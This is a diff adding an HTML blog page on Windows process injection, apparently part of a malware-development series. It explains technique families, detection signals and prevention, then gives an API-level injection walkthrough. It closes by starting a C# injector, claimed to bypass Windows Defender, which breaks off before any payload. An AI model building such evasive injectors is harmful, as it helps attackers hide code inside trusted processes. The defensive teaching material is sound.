@@ -1,0 +1,937 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Iron Hulk – ProcessInjection</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js" defer></script>
+</head>
+<body class="bg-[#0f172a] text-white font-sans min-h-screen">
+<!-- Header -->
+<header class="bg-[#1e293b] p-4 shadow flex items-center justify-between gap-4">
+    <div>
+    <h1 class="text-xl font-bold text-blue-400">ProcessInjection</h1>
+    <small id="reading-time" class="text-xs text-gray-400"></small>
+    </div>
+    <a href="../blog.html" class="text-gray-300 text-sm hover:underline">← Back to Blogs</a>
+</header>
+<main id="article" class="p-6 sm:text-justify">
+    <div class="relative isolate overflow-hidden rounded-2xl bg-[#04151f] p-10 shadow-xl ring-1 ring-teal-400/25">
+        <div class="relative grid grid-cols-1 lg:grid-cols-2 gap-10">
+            <section class="space-y-8 text-slate-200">
+                <h2 class="inline-block bg-gradient-to-r from-teal-400 via-cyan-300 to-indigo-400 bg-clip-text text-5xl font-extrabold tracking-tight text-transparent drop-shadow-[0_3px_6px_rgba(0,255,240,0.35)]">
+                    Process Injection 
+                </h2>
+                <article>
+                    <h3 class="text-lg font-semibold text-teal-300">What is Process Injection?</h3>
+                    <p class="mt-2 leading-relaxed">
+                        Think of a program file as an instruction manual sitting on disk. The moment the operating-system loader reads that manual and begins following the instructions, the program stops 
+                        being a passive file and becomes a process: an active, in-memory instance with its own identity (PID), a private virtual-address space, a security context (token), open handles, 
+                        and a collection of threads that execute its code. The operating system tracks every detail of this living entity in a data structure called the Process Control Block (PCB). From 
+                        the user’s perspective, a process is the <strong>running application</strong>; from the kernel’s perspective, it is a container of resources that must be scheduled, protected, and eventually 
+                        cleaned up.
+                    </p>
+                </article>
+                <article>
+                    <h3 class="text-lg font-semibold text-teal-300">Key Points:</h3>
+                    <ul class="list-disc list-inside text-sm leading-relaxed">
+                    <li>A process is created when a program is launched.</li>
+                    <li>It has a unique Process ID (PID) assigned by the operating system.</li>
+                    <li>Processes can spawn child processes, forming a hierarchy.</li>
+                    </ul>
+                </article>
+                <article>
+                    <h3 class="text-lg font-semibold text-teal-300">Technique families:</h3>
+                    <ul class="list-disc list-inside text-sm leading-relaxed">
+                    <li><strong>Alloc ➜ Write ➜ Run </strong>(remote thread, Early-Bird APC)</li>
+                    <li><strong>Image replacement </strong>(hollowing, ghosting, doppelgänging)</li>
+                    <li><strong>Thread hijack </strong>(suspend-patch-resume, APC queue)</li>
+                    <li><strong>Hook/Callback abuse </strong>(<code class="bg-[#334155] text-blue-300 rounded px-1">SetWindowsHookEx</code>, Ldr callbacks)</li>
+                    <li><strong>Reflective mapping </strong>(manual DLL map, sRDI)</li>
+                    </ul>
+                </article>
+                <div class="grid grid-cols-2 gap-6 pt-2 text-sm leading-relaxed">
+                    <div>
+                    <h3 class="mb-1 font-semibold text-teal-300">Detect:</h3>
+                    <ul class="list-disc pl-5 space-y-0.5">
+                        <li>❗ <code class="bg-[#334155] text-blue-300 rounded px-1">RWX</code> page flips</li>
+                        <li>⚠️ remote thread in unknown region</li>
+                        <li>🔍 Sysmon 8/10/11 spikes</li>
+                    </ul>
+                    </div>
+                    <div>
+                    <h3 class="mb-1 font-semibold text-teal-300">Prevent:</h3>
+                    <ul class="list-disc pl-5 space-y-0.5">
+                        <li>🛡️ HVCI / KMCI</li>
+                        <li>🔐 WDAC / AppLocker</li>
+                        <li>🚫 Block <code class="bg-[#334155] text-blue-300 rounded px-1">PROCESS_VM_WRITE</code></li>
+                    </ul>
+                    </div>
+                </div>
+            </section>
+            <figure class="relative flex items-center justify-center ">
+            <img src="../MalDev/images/PrIn.png"  class="max-h-full w-full object-contain">
+            </figure>
+        </div>
+        <br>
+        <div class="rounded-2xl bg-[#04151f] p-10 shadow-xl ring-1 ring-teal-400/25">
+
+            <div class="relative grid grid-cols-1 gap-10">
+                <section class="space-y-4 text-gray-200">
+                    <h2 class="inline-block bg-gradient-to-r from-teal-400 via-cyan-300 to-indigo-400 bg-clip-text text-5xl font-extrabold tracking-tight text-transparent drop-shadow-[0_3px_6px_rgba(0,255,240,0.35)]">
+                        How Does It Work and Its States
+                    </h2>
+                    <h3 class="text-lg font-semibold text-indigo-300">When you launch an application, the loader:</h3>
+                    <ol class="list-decimal pl-6 leading-relaxed text-sm">
+                        <li>📂 <b>Map binaries:</b> Maps the executable and its DLLs into a fresh address space.</li>
+                        <li>🗄️ <b>Set up memory:</b> Builds the initial stack, heap, and Thread Environment Block.</li>
+                        <li>⚡ <b>Spawn entry thread:</b> Creates the first thread, pointing its instruction pointer at the program’s entry-point</li>
+                    </ol>
+                    <h3 class="text-lg font-semibold text-indigo-300 pt-2">Core states</h3>
+                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-4 text-sm">
+                        <div class="rounded-lg bg-[#1e293b] p-4 ring-1 ring-indigo-500/20">
+                            <p class="font-semibold text-indigo-400">🆕 New</p>
+                            <p class="mt-1 leading-relaxed">OS builds internal structures; not yet eligible to run and the process is being created.</p>
+                        </div>
+                        <div class="rounded-lg bg-[#1e293b] p-4 ring-1 ring-indigo-500/20">
+                            <p class="font-semibold text-indigo-400">🕒 Ready</p>
+                            <p class="mt-1 leading-relaxed">The process is loaded into memory and waiting for CPU time.</p>
+                        </div>
+                        <div class="rounded-lg bg-[#1e293b] p-4 ring-1 ring-indigo-500/20">
+                            <p class="font-semibold text-indigo-400">⚙️ Running</p>
+                            <p class="mt-1 leading-relaxed">The process is executing on the CPU.</p>
+                        </div>
+                        <div class="rounded-lg bg-[#1e293b] p-4 ring-1 ring-indigo-500/20">
+                            <p class="font-semibold text-indigo-400">⏸️ Waiting/Blocked</p>
+                            <p class="mt-1 leading-relaxed">The process is paused, waiting for an event (Ex: I/O operation).</p>
+                        </div>
+                        <div class="rounded-lg bg-[#1e293b] p-4 ring-1 ring-indigo-500/20 sm:col-span-2">
+                            <p class="font-semibold text-indigo-400">🏁 Terminated</p>
+                            <p class="mt-1 leading-relaxed">The process has finished execution or was forcefully stopped.</p>
+                        </div>
+                    </div>
+                </section>
+                <blockquote class="border-l-4 border-blue-400 pl-4 italic">
+                    💡 Context switches move the CPU between the Ready and Running processes in milliseconds, preserving the illusion that hundreds of programs run simultaneously.
+                </blockquote>   
+            </div>
+        </div>
+        <br>
+        <div class="rounded-2xl bg-[#04151f] p-10 shadow-xl ring-1 ring-teal-400/25">
+            <h2 class=" mb-5 text-left text-5xl font-extrabold tracking-tight bg-gradient-to-r from-teal-400 via-cyan-300 to-indigo-400 bg-clip-text text-transparent drop-shadow-[0_3px_6px_rgba(0,255,240,0.35)]">
+            Injection vs Process Injection?
+            </h2>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-12">
+                <div class="space-y-8 text-slate-200">
+                    <article>
+                        <h3 class="mb-2 text-lg font-semibold text-teal-300">What is injection?</h3>
+                        <p class="leading-relaxed">
+                            <strong>Injection:</strong> is the art of sneaking data or code into a context that implicitly trusts its input, think a poisoned SQL statement, command, 
+                            or script. The interpreter accepts and runs the hostile payload as if it were legitimate logic.
+                        </p>
+                    </article>
+                    <article>
+                        <h3 class="mb-2 text-lg font-semibold text-teal-300">What is process injection?</h3>
+                        <p class="leading-relaxed">
+                            <strong>Process injection:</strong> is a method where an attacker inserts malicious code into a legitimate process's memory space. This allows the attacker to execute 
+                            code under the guise of the legitimate process, bypassing security measures. The main goal is Execute malicious/payload code within a trusted process to, Evade Detection
+                            Access the target process’s memory/resources or Escalate Privileges.
+                        </p>
+                    </article>
+                    <article>
+                        <h3 class="mb-2 text-lg font-semibold text-teal-300">Why attackers use it?</h3>
+                        <ul class="list-disc pl-6 space-y-1 text-sm leading-relaxed">
+                            <li>🕵️‍♂️ Hides inside trusted binaries to bypass AV/EDR.</li>
+                            <li>🔑 Re-uses the target’s credentials and open network sessions.</li>
+                            <li>📉 Leaves few artefacts, often completely file-less.</li>
+                        </ul>
+                    </article>
+                </div>
+                <div class="space-y-8 text-slate-200">
+                    <article>
+                        <h3 class="mb-4 text-lg font-semibold text-teal-300">Typical flow</h3>
+                        <ol class="space-y-4 text-sm">
+                            <li class="flex items-start gap-3">
+                            <span class="mt-1 h-2 w-2 flex-none rounded-full bg-teal-300"></span>
+                            <span><b>Handle access</b><br> <code class="bg-[#334155] text-blue-300 rounded px-1">PROCESS_VM_WRITE</code>/<code class="bg-[#334155] text-blue-300 rounded px-1">PROCESS_CREATE_THREAD</code></span>
+                            </li>
+                            <li class="flex items-start gap-3">
+                            <span class="mt-1 h-2 w-2 flex-none rounded-full bg-teal-300"></span>
+                            <span><b>Allocate memory</b><br>Uses OS APIs <code class="bg-[#334155] text-blue-300 rounded px-1">VirtualAllocEx()</code> to allocate memory inside the target process.</span>
+                            </li>
+                            <li class="flex items-start gap-3">
+                            <span class="mt-1 h-2 w-2 flex-none rounded-full bg-teal-300"></span>
+                            <span><b>Write payload</b><br>Copies malicious code (DLL or shellcode) into that memory <code class="bg-[#334155] text-blue-300 rounded px-1">WriteProcessMemory</code></span>
+                            </li>
+                            <li class="flex items-start gap-3">
+                            <span class="mt-1 h-2 w-2 flex-none rounded-full bg-teal-300"></span>
+                            <span><b>Trigger execution</b><br>Forces the target process to run the payload via <code class="bg-[#334155] text-blue-300 rounded px-1">CreateRemoteThread()</code>.</span>
+                            </li>
+                        </ol>
+                    </article>
+                </div>
+            </div>
+        </div>
+        <br>
+        <div class="rounded-2xl bg-[#04151f] p-10 shadow-xl ring-1 ring-teal-400/25">
+            <h2 class="mb-5 text-left text-5xl font-extrabold tracking-tight bg-gradient-to-r from-teal-400 via-cyan-300 to-indigo-400 bg-clip-text text-transparent drop-shadow-[0_3px_6px_rgba(0,255,240,0.35)]">
+                Why Process Injection Is Dangerous? 
+            </h2>
+            <p class="leading-relaxed">
+                A running process inherits the trust and thus the permissions granted to its executable image. By forcing hostile code to execute inside that already-trusted boundary, an attacker
+                gains:
+            </p>
+            <br>
+            <ul class="grid gap-8 text-slate-200 sm:grid-cols-2">
+                <li class="flex items-start gap-4">
+                    <span class="mt-1 inline-flex h-6 w-6 flex-none items-center justify-center rounded-full bg-rose-400/25 ring-1 ring-rose-400/30">🛡️</span>
+                    <p class="leading-relaxed">
+                    <strong class="mb-4 text-lg font-semibold text-teal-300">Defense Evasion:</strong><br>
+                    AV/EDR sensors apply lighter scrutiny to permitted binaries; malware that “lives off the land” inside <code class="bg-[#334155] text-blue-300 rounded px-1">explorer.exe</code>, <code class="bg-[#334155] text-blue-300 rounded px-1">lsass.exe</code>, or a signed vendor agent blends into normal 
+                    telemetry and inherits that binary’s allow-lists and exclusions.
+                    </p>
+                </li>
+                <li class="flex items-start gap-4">
+                    <span class="mt-1 inline-flex h-6 w-6 flex-none items-center justify-center rounded-full bg-rose-400/25 ring-1 ring-rose-400/30">🌐</span>
+                    <p class="leading-relaxed">
+                    <strong class="mb-4 text-lg font-semibold text-teal-300">Surface Expansion:</strong><br>
+                    Attackers gain the victim’s open sockets, named pipes, and GUI handles, making exfiltration or C2 traffic look like ordinary application chatter.
+                    </p>
+                </li>
+                <li class="flex items-start gap-4">
+                    <span class="mt-1 inline-flex h-6 w-6 flex-none items-center justify-center rounded-full bg-rose-400/25 ring-1 ring-rose-400/30">👻</span>
+                    <p class="leading-relaxed">
+                    <strong class="mb-4 text-lg font-semibold text-teal-300">Stealth Persistence:</strong><br>
+                    Reflective loaders keep everything in-memory. No new executable hits disk, and the malware can re-inject after reboot via innocuous tasks or macros.
+                    </p>
+                </li>
+                <li class="flex items-start gap-4">
+                    <span class="mt-1 inline-flex h-6 w-6 flex-none items-center justify-center rounded-full bg-rose-400/25 ring-1 ring-rose-400/30">📡</span>
+                    <p class="leading-relaxed">
+                      <strong class="mb-4 text-lg font-semibold text-teal-300">Lateral Movement:</strong><br>
+                      Attackers can inject into processes on remote systems leveraging RPC, WMI, PsExec, or exploit kits to propagate across the network and widen their foothold.
+                    </p>
+                  </li>
+            </ul>
+        </div>
+        <br>
+    
+        <div class="relative rounded-2xl bg-gradient-to-br from-[#06141f] via-[#081b29] to-[#071a25] p-12 shadow-2xl ring-1 ring-cyan-500/20">
+            <header class="mb-5 text-center">
+            <h2 class="text-4xl font-black tracking-wide text-cyan-200 drop-shadow-[0_4px_8px_rgba(8,145,178,0.35)]"> Process Injection<br class="sm:hidden" />
+                <span class="bg-gradient-to-r from-cyan-300 via-sky-300 to-indigo-400 bg-clip-text text-transparent">Blue-Team Signals</span>
+            </h2>
+            <p class="mt-4 text-sm text-slate-400">
+                Prioritise these high-signal clues to catch injections before they escalate.
+            </p>
+            </header>
+            <section class="grid gap-10 lg:grid-cols-3">
+                <article class="group relative rounded-xl border border-cyan-400/10 bg-[#0b2434] p-6 transition hover:border-cyan-400/30">
+                    <h3 class="mb-2 flex items-center gap-2 font-semibold text-cyan-300">Abnormal Handles</h3>
+                    <p class="text-sm leading-relaxed text-slate-200">
+                        Alert on <code class="bg-[#334155] text-blue-300 rounded px-1">OpenProcess(PROCESS_VM_WRITE | PROCESS_CREATE_THREAD…)</code> where caller ≠ target parent, or when a <strong>Medium-integrity</strong> process opens a <strong>High-integrity target</strong>
+                        or from <strong>Normal User</strong> to <strong>SYSTEM</strong>.
+                    </p>
+                    <span
+                    class="pointer-events-none absolute -inset-[1px] rounded-xl opacity-0 transition group-hover:opacity-100 ring-1 ring-cyan-400/30"></span>
+                </article>
+                <article class="group relative rounded-xl border border-cyan-400/10 bg-[#0b2434] p-6 transition hover:border-cyan-400/30">
+                    <h3 class="mb-2 flex items-center gap-2 font-semibold text-cyan-300">Suspicious memory patterns</h3>
+                    <p class="text-sm leading-relaxed text-slate-200">
+                    Watch for fresh <code class="bg-[#334155] text-blue-300 rounded px-1">RWX</code>/<code class="bg-[#334155] text-blue-300 rounded px-1">RX</code> regions, or rapid <code class="bg-[#334155] text-blue-300 rounded px-1">RW→RX</code>
+                    flips with high entropy and no PE header.
+                    </p>
+                    <span
+                    class="pointer-events-none absolute -inset-[1px] rounded-xl opacity-0 transition group-hover:opacity-100 ring-1 ring-cyan-400/30"></span>
+                </article>
+                <article class="group relative rounded-xl border border-cyan-400/10 bg-[#0b2434] p-6 transition hover:border-cyan-400/30">
+                    <h3 class="mb-2 flex items-center gap-2 font-semibold text-cyan-300">API Monitoring</h3>
+                    <p class="text-sm leading-relaxed text-slate-200">
+                    Watch for suspicious calls such as: <code class="bg-[#334155] text-blue-300 rounded px-1">VirtualAllocEx/WriteProcessMemory/CreateRemoteThread</code>.
+                    </p>
+                    <span
+                    class="pointer-events-none absolute -inset-[1px] rounded-xl opacity-0 transition group-hover:opacity-100 ring-1 ring-cyan-400/30"></span>
+                </article>
+                <article class="group relative rounded-xl border border-cyan-400/10 bg-[#0b2434] p-6 transition hover:border-cyan-400/30">
+                    <h3 class="mb-2 flex items-center gap-2 font-semibold text-cyan-300">Process Relationships</h3>
+                    <p class="text-sm leading-relaxed text-slate-200">
+                        Baseline normal process behavior and flag deviations like <code class="bg-[#334155] text-blue-300 rounded px-1">msiexec.exe</code> and spawning <code class="bg-[#334155] text-blue-300 rounded px-1">cmd.exe</code> is not normal.
+                    </p>
+                    <span
+                    class="pointer-events-none absolute -inset-[1px] rounded-xl opacity-0 transition group-hover:opacity-100 ring-1 ring-cyan-400/30"></span>
+                </article>
+                <article class="group relative rounded-xl border border-cyan-400/10 bg-[#0b2434] p-6 transition hover:border-cyan-400/30">
+                    <h3 class="mb-2 flex items-center gap-2 font-semibold text-cyan-300">Logging and EDR</h3>
+                    <p class="text-sm leading-relaxed text-slate-200">
+                        Use Endpoint Detection and Response (EDR) tools to log process creation, memory writes, and thread activity.
+                    </p>
+                    <span
+                    class="pointer-events-none absolute -inset-[1px] rounded-xl opacity-0 transition group-hover:opacity-100 ring-1 ring-cyan-400/30"></span>
+                </article>
+            </section>
+            <br><br>
+            <blockquote class="border-l-4 border-blue-400 pl-4 italic">
+                💡 Modern EDRs chain these signals with ML models, but blue-teams can approximate with Sysmon + Yara + Windows Defender Attack Surface Reduction (ASR) rules.
+            </blockquote> 
+        </div>
+        <br>
+        <div class="relative rounded-2xl bg-gradient-to-br from-[#06141f] via-[#081b29] to-[#071a25] p-12 shadow-2xl ring-1 ring-cyan-500/20">
+            <header class="mb-5 text-center">
+            <h2 class="text-4xl font-black tracking-wide bg-gradient-to-r from-emerald-300 via-teal-300 to-cyan-400 bg-clip-text text-transparent drop-shadow-[0_4px_8px_rgba(16,185,129,0.35)]">
+                Preventing Process Injection
+            </h2>
+            <p class="mt-4 text-sm text-slate-400">Layered controls that raise the cost of in-memory attacks.</p>
+            </header>
+            <section class="grid gap-10 lg:grid-cols-3">
+            <article class="group relative rounded-xl border border-emerald-400/10 bg-[#0f222f] p-6 transition hover:border-emerald-400/30">
+                <h3 class="mb-2 flex items-center gap-2 font-semibold text-emerald-300">
+                🔒 Least-Privilege Handles:
+                </h3>
+                <p class="text-sm leading-relaxed text-slate-200">
+                    Run applications and users with minimal permissions with no admin rights.
+                </p>
+                <span class="pointer-events-none absolute -inset-[1px] rounded-xl opacity-0 transition group-hover:opacity-100 ring-1 ring-emerald-400/30"></span>
+            </article>
+            <article class="group relative rounded-xl border border-emerald-400/10 bg-[#0f222f] p-6 transition hover:border-emerald-400/30">
+                <h3 class="mb-2 flex items-center gap-2 font-semibold text-emerald-300">
+                🧬 OS Hardening:
+                </h3>
+                <p class="text-sm leading-relaxed text-slate-200">
+                    Disable unnecessary COM/DLL components via Attack Surface Reduction rules.
+                </p>
+                <span class="pointer-events-none absolute -inset-[1px] rounded-xl opacity-0 transition group-hover:opacity-100 ring-1 ring-emerald-400/30"></span>
+            </article>
+            <article class="group relative rounded-xl border border-emerald-400/10 bg-[#0f222f] p-6 transition hover:border-emerald-400/30">
+                <h3 class="mb-2 flex items-center gap-2 font-semibold text-emerald-300">
+                🛠️ Behavioral Monitoring:
+                </h3>
+                <p class="text-sm leading-relaxed text-slate-200">
+                    Deploy EDR solutions that analyze process behavior in real-time.
+                </p>
+                <span class="pointer-events-none absolute -inset-[1px] rounded-xl opacity-0 transition group-hover:opacity-100 ring-1 ring-emerald-400/30"></span>
+            </article>
+            <article class="group relative rounded-xl border border-emerald-400/10 bg-[#0f222f] p-6 transition hover:border-emerald-400/30">
+                <h3 class="mb-2 flex items-center gap-2 font-semibold text-emerald-300">
+                📜 Application Whitelisting:
+                </h3>
+                <p class="text-sm leading-relaxed text-slate-200">
+                    Enforce WDAC or AppLocker to restrict which binaries can start or load DLLs; and only allow trusted executables.
+                </p>
+                <span class="pointer-events-none absolute -inset-[1px] rounded-xl opacity-0 transition group-hover:opacity-100 ring-1 ring-emerald-400/30"></span>
+            </article>
+            <article class="group relative rounded-xl border border-emerald-400/10 bg-[#0f222f] p-6 transition hover:border-emerald-400/30">
+                <h3 class="mb-2 flex items-center gap-2 font-semibold text-emerald-300">
+                🚨 Network Segmentation:
+                </h3>
+                <p class="text-sm leading-relaxed text-slate-200">
+                    Isolate critical systems; restrict lateral movement paths.
+                </p>
+                <span class="pointer-events-none absolute -inset-[1px] rounded-xl opacity-0 transition group-hover:opacity-100 ring-1 ring-emerald-400/30"></span>
+            </article>
+            <article class="group relative rounded-xl border border-emerald-400/10 bg-[#0f222f] p-6 transition hover:border-emerald-400/30">
+                <h3 class="mb-2 flex items-center gap-2 font-semibold text-emerald-300">
+                🏗️ Patch Management:
+                </h3>
+                <p class="text-sm leading-relaxed text-slate-200">
+                    Keep operating systems and software updated to fix vulnerabilities exploited for injection.
+                </p>
+                <span class="pointer-events-none absolute -inset-[1px] rounded-xl opacity-0 transition group-hover:opacity-100 ring-1 ring-emerald-400/30"></span>
+            </article>
+            </section>
+            <br><br>
+            <blockquote class="border-l-4 border-blue-400 pl-4 italic">
+                💡 Process injection is a versatile and stealthy attack technique, but understanding its mechanics, detection methods, and prevention strategies can significantly reduce the risk.
+                    No single control is absolute, so combining technical controls such as policy, prevention, detection, correction, will help in mitigating the attack.
+            </blockquote> 
+        </div>
+        <br>
+        <div class="relative rounded-2xl bg-gradient-to-br from-[#06141f] via-[#081b29] to-[#071a25] p-12 shadow-2xl ring-1 ring-cyan-500/20">
+            <h2 class="mb-8 text-center text-4xl font-extrabold tracking-wide bg-gradient-to-r from-purple-300 via-pink-300 to-rose-400 bg-clip-text text-transparent">
+            Process Injection Techniques
+            </h2>
+            <div class="overflow-x-auto">
+            <table class="min-w-full divide-y divide-purple-500/20 text-slate-200">
+                <thead class="bg-[#181e2b] text-sm uppercase tracking-wider">
+                <tr>
+                    <th class="px-4 py-3 text-left">Technique</th>
+                    <th class="px-4 py-3 text-left">How It Works</th>
+                    <th class="px-4 py-3 text-left">Primary Use-Case</th>
+                </tr>
+                </thead>
+                <tbody class="divide-y divide-purple-500/10 text-sm">
+                <tr class="hover:bg-white/5">
+                    <td class="px-4 py-3 font-semibold text-violet-200">DLL Injection</td>
+                    <td class="px-4 py-3">Forces target to load a malicious DLL via <code class="bg-[#334155] text-blue-300 rounded px-1">LoadLibrary()</code></td>
+                    <td class="px-4 py-3">Stealth payload execution</td>
+                </tr>
+                <tr class="hover:bg-white/5">
+                    <td class="px-4 py-3 font-semibold text-violet-200">Reflective DLL</td>
+                    <td class="px-4 py-3">Maps and calls the DLL entirely from memory without touching disk</td>
+                    <td class="px-4 py-3">EDR file-scan evasion</td>
+                </tr>
+                <tr class="hover:bg-white/5">
+                    <td class="px-4 py-3 font-semibold text-violet-200">Process Hollowing</td>
+                    <td class="px-4 py-3">Overwrites a suspended process’s memory (e.g., <code class="bg-[#334155] text-blue-300 rounded px-1">notepad.exe</code>) with malware</td>
+                    <td class="px-4 py-3">Ransomware deployment</td>
+                </tr>
+                <tr class="hover:bg-white/5">
+                    <td class="px-4 py-3 font-semibold text-violet-200">APC Injection</td>
+                    <td class="px-4 py-3">Queues malicious code in an Asynchronous Procedure Call to victim threads</td>
+                    <td class="px-4 py-3">Living-off-the-land attacks</td>
+                </tr>
+                <tr class="hover:bg-white/5">
+                    <td class="px-4 py-3 font-semibold text-violet-200">Thread Exec Hijack</td>
+                    <td class="px-4 py-3">Redirects an existing thread’s instruction pointer to shellcode</td>
+                    <td class="px-4 py-3">Thread-based detection bypass</td>
+                </tr>
+                <tr class="hover:bg-white/5">
+                    <td class="px-4 py-3 font-semibold text-violet-200">Early-Bird APC</td>
+                    <td class="px-4 py-3">Injects code before the target’s main thread starts executing</td>
+                    <td class="px-4 py-3">Runtime-hook evasion</td>
+                </tr>
+                <tr class="hover:bg-white/5">
+                    <td class="px-4 py-3 font-semibold text-violet-200">Herpaderping</td>
+                    <td class="px-4 py-3">Abuses process-creation race conditions to hide the malicious image</td>
+                    <td class="px-4 py-3">Disk-forensic evasion</td>
+                </tr>
+                </tbody>
+            </table>
+            </div>
+        </div>
+        <br>
+        <div class="relative rounded-2xl bg-gradient-to-br from-[#071a25] via-[#081b29] to-[#06141f] p-12 shadow-2xl ring-1 ring-teal-500/25">
+            <h2 class="mb-12 text-center text-4xl font-extrabold tracking-wide bg-gradient-to-r from-teal-300 via-cyan-300 to-indigo-400 bg-clip-text text-transparent">
+            Process Injection Walkthrough
+            </h2>
+            <ol class="relative border-l-2 border-teal-500/30 pl-8 space-y-10">
+            <li>
+                <span class="absolute -left-[10px] flex h-5 w-5 items-center justify-center rounded-full bg-teal-500/20 ring-2 ring-teal-400/50 text-xs font-bold text-teal-200">1</span>
+                <h3 class="text-lg font-semibold text-teal-300 mb-1">Attach to the Running Process</h3>
+                <p class="leading-relaxed text-slate-200 text-sm">
+                Call <code class="bg-[#334155] text-blue-300 rounded px-1">OpenProcess()</code> or <code class="bg-[#334155] text-blue-300 rounded px-1">NtOpenProcess</code> to get a handle to the target process
+                with <code class="bg-[#334155] text-blue-300 rounded px-1">PROCESS_VM_WRITE</code> &amp; <code class="bg-[#334155] text-blue-300 rounded px-1">PROCESS_CREATE_THREAD</code>.<br>
+                <strong>Why:</strong> Grants you permission to modify memory and start threads inside the targeted process.
+                </p>
+            </li>
+            <li>
+                <span class="absolute -left-[10px] flex h-5 w-5 items-center justify-center rounded-full bg-teal-500/20 ring-2 ring-teal-400/50 text-xs font-bold text-teal-200">2</span>
+                <h3 class="text-lg font-semibold text-teal-300 mb-1">Allocate Memory</h3>
+                <p class="leading-relaxed text-slate-200 text-sm">
+                Use <code class="bg-[#334155] text-blue-300 rounded px-1">VirtualAllocEx()</code> to allocate an RW region in the targeted process.<br>
+                <strong>Why:</strong> Provides a safe, private space to drop your payload without corrupting existing data.
+                </p>
+            </li>
+            <li>
+                <span class="absolute -left-[10px] flex h-5 w-5 items-center justify-center rounded-full bg-teal-500/20 ring-2 ring-teal-400/50 text-xs font-bold text-teal-200">3</span>
+                <h3 class="text-lg font-semibold text-teal-300 mb-1">Write the Payload</h3>
+                <p class="leading-relaxed text-slate-200 text-sm">
+                Call <code class="bg-[#334155] text-blue-300 rounded px-1">WriteProcessMemory()</code> to copy your shellcode or reflective stub into the allocated pages.<br>
+                <strong>Why:</strong> Places the executable instructions inside the target’s address space.
+                </p>
+            </li>
+            <li>
+                <span class="absolute -left-[10px] flex h-5 w-5 items-center justify-center rounded-full bg-teal-500/20 ring-2 ring-teal-400/50 text-xs font-bold text-teal-200">4</span>
+                <h3 class="text-lg font-semibold text-teal-300 mb-1">Change to Execute</h3>
+                <p class="leading-relaxed text-slate-200 text-sm">
+                Invoke <code class="bg-[#334155] text-blue-300 rounded px-1">VirtualProtectEx()</code> to switch pages to <code class="bg-[#334155] text-blue-300 rounded px-1">PAGE_EXECUTE_READ</code>.<br>
+                <strong>Why:</strong> Tthe CPU will run your code.
+                </p>
+            </li>
+            <li>
+                <span class="absolute -left-[10px] flex h-5 w-5 items-center justify-center rounded-full bg-teal-500/20 ring-2 ring-teal-400/50 text-xs font-bold text-teal-200">5</span>
+                <h3 class="text-lg font-semibold text-teal-300 mb-1">Trigger Execution</h3>
+                <p class="leading-relaxed text-slate-200 text-sm">
+                Call <code class="bg-[#334155] text-blue-300 rounded px-1">CreateRemoteThread()</code>, or an APC Injection, or thread hijack to hand control to your code.<br>
+                <strong>Why:</strong> Launches the payload inside the process, inheriting its trust and privileges.
+                </p>
+            </li>
+            </ol>
+        </div>
+        <br>
+        <div class="relative rounded-2xl bg-gradient-to-br from-[#071a25] via-[#081b29] to-[#06141f] p-12 shadow-2xl ring-1 ring-teal-500/25">
+            <h2 class="mb-4 text-3xl font-bold text-white">C# project: <span class="text-blue-400">Process Injection</span></h2>
+            <p class="mb-4 text-sm text-slate-400">This has been tested and <strong>will</strong> bypass windows defender.</p>
+            <details class="bg-gray-800 bg-opacity-50 p-4 rounded-lg group">
+                <summary class="flex items-center justify-between text-xl font-semibold text-indigo-300 cursor-pointer ">
+                    <span>Hardcoded Shellcode</span>
+                    <svg class="w-6 h-6 transform transition-transform duration-200 group-open:rotate-180 text-indigo-400" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7"/>
+                    </svg>
+                </summary>
+                <p class="mb-4 text-sm text-slate-400">We have used the same encryption project from <a href="PayloadEncryption.html" class="group items-center gap-2 hover:text-indigo-400 text-blue-400 transition">Payload Encryption.</a></p>
+                <div class="mt-4 relative ">
+                    <button class="absolute top-2 right-2 bg-indigo-500 text-white px-3 py-1 rounded text-sm" onclick="copyCode(this)">Copy</button>
+                    <pre class="mt-8 overflow-x-auto bg-gray-900 p-4 rounded-lg shadow-inner ">
+                    <code class="language-csharp text-green-300  ">
+// Project Name: Process Injection - Hardcoded shellcode
+// By: Iron Hulk
+
+using System;
+using System.IO;
+using System.Text;
+using System.Security.Cryptography;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+using System.Threading;
+
+class Win32
+{
+    [DllImport("kernel32")]
+    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+
+    [DllImport("kernel32")]
+    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, Int32 flAllocationType, Int32 flProtect);
+
+    [DllImport("kernel32.dll")]
+    public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, int flNewProtect, out int lpflOldProtect);
+
+    [DllImport("kernel32")]
+    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+    [DllImport("kernel32")]
+    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, IntPtr dwSize, int lpNumberOfBytesWritten);
+
+    [DllImport("kernel32")]
+    public static extern IntPtr GetConsoleWindow();
+
+    [DllImport("user32")]
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+    public const int PROCESS_CREATE_THREAD = 0x0002;
+    public const int PROCESS_QUERY_INFORMATION = 0x0400;
+    public const int PROCESS_VM_OPERATION = 0x0008;
+    public const int PROCESS_VM_WRITE = 0x0020;
+    public const int PROCESS_VM_READ = 0x0010;
+    public const int MEM_COMMIT = 0x1000;
+    public const int PAGE_EXECUTE_READWRITE = 0x40;
+    public const int PAGE_EXECUTE_READ = 0x20;
+    public const int PAGE_READWRITE = 0x04;
+    public const int SW_HIDE = 0;
+}
+
+class Program
+{
+    static void Main(string[] args)
+    {
+        IntPtr handle = Win32.GetConsoleWindow();
+        Win32.ShowWindow(handle, Win32.SW_HIDE);
+
+        // Encrypted payload goes here
+
